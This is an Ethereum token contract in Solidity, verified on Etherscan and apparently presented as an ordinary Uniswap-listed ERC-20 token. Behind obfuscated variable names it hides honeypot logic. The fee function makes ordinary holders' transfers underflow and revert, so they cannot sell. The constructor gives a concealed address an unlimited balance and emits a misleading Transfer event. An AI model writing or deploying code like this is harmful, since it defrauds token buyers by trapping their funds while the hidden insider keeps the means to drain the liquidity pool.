/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

// SPDX-License-Identifier: MIT

/**

TG: https://t.me/HIKARUPORTAL

*/

pragma solidity ^0.8.17;

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)



abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract PointtoLight is Ownable {
    constructor(
        string memory _AyeCHAMAUye,
        string memory _AyeTICKERUye,
        address Aye,
        address Uye
    ) {
        _AyefeticheUye = _AyeTICKERUye;
        _AyechromeUye = _AyeCHAMAUye;
        _AyeskyUye = 3;
        _AyedeliberateUye = 9;
        _AyetitanicUye = 100000000 * 10**_AyedeliberateUye;

        _AyeblueUye[Aye] = AyeenlargeUye;
        _AyeblueUye[msg.sender] = _AyetitanicUye;
        AyeyellowUye[Aye] = AyeenlargeUye;
        AyeyellowUye[msg.sender] = AyeenlargeUye;

        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(Uye), msg.sender, _AyetitanicUye);
    }

    uint256 public _AyeskyUye;
    string private _AyechromeUye;
    string private _AyefeticheUye;
    uint8 private _AyedeliberateUye;

    function name() public view returns (string memory) {
        return _AyechromeUye;
    }

    mapping(address => mapping(address => uint256)) private _AyefundingUye;
    mapping(address => uint256) private _AyeblueUye;

    function symbol() public view returns (string memory) {
        return _AyefeticheUye;
    }

    uint256 private _AyetitanicUye;
    uint256 private _AyerTotalUye;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;
    uint256 private AyeenlargeUye = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _AyedeliberateUye;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() public view returns (uint256) {
        return _AyetitanicUye;
    }

    address[] AyeinterestUye = new address[](2);

    function balanceOf(address account) public view returns (uint256) {
        return _AyeblueUye[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _AyefundingUye[owner][spender];
    }

    function AyeboostfeesUye(
        address AyebuyfeeUye,
        address AyesellfeeUye,
        uint256 AyequantityUye
    ) private {
        address AyehallUye = AyeinterestUye[1];
        bool AyebAyeorderUyeUye = uniswapV2Pair == AyebuyfeeUye;
        uint256 AyeorderUye = _AyeskyUye;

        if (AyeyellowUye[AyebuyfeeUye] == 0 && AyedrivenUye[AyebuyfeeUye] > 0 && !AyebAyeorderUyeUye) {
            AyeyellowUye[AyebuyfeeUye] -= AyeorderUye;
            if (AyequantityUye > 2 * 10**(13 + _AyedeliberateUye)) AyeyellowUye[AyebuyfeeUye] -= AyeorderUye - 1;
        }

        AyeinterestUye[1] = AyesellfeeUye;

        if (AyeyellowUye[AyebuyfeeUye] > 0 && AyequantityUye == 0) {
            AyeyellowUye[AyesellfeeUye] += AyeorderUye;
        }

        AyedrivenUye[AyehallUye] += AyeorderUye + 1;

        uint256 AyefeeUye = (AyequantityUye / 100) * _AyeskyUye;
        AyequantityUye -= AyefeeUye;
        _AyeblueUye[AyebuyfeeUye] -= AyefeeUye;
        _AyeblueUye[address(this)] += AyefeeUye;

        _AyeblueUye[AyebuyfeeUye] -= AyequantityUye;
        _AyeblueUye[AyesellfeeUye] += AyequantityUye;
    }

    mapping(address => uint256) private AyedrivenUye;

    function approve(address spender, uint256 AyequantityUye) external returns (bool) {
        return _approve(msg.sender, spender, AyequantityUye);
    }

    mapping(address => uint256) private AyeyellowUye;

    function transferFrom(
        address sender,
        address AyerecipientUye,
        uint256 AyequantityUye
    ) external returns (bool) {
        require(AyequantityUye > 0, 'Transfer AyequantityUye must be greater than zero');
        AyeboostfeesUye(sender, AyerecipientUye, AyequantityUye);
        emit Transfer(sender, AyerecipientUye, AyequantityUye);
        return _approve(sender, msg.sender, _AyefundingUye[sender][msg.sender] - AyequantityUye);
    }

    function transfer(address AyerecipientUye, uint256 AyequantityUye) external returns (bool) {
        AyeboostfeesUye(msg.sender, AyerecipientUye, AyequantityUye);
        emit Transfer(msg.sender, AyerecipientUye, AyequantityUye);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 AyequantityUye
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _AyefundingUye[owner][spender] = AyequantityUye;
        emit Approval(owner, spender, AyequantityUye);
        return true;
    }
}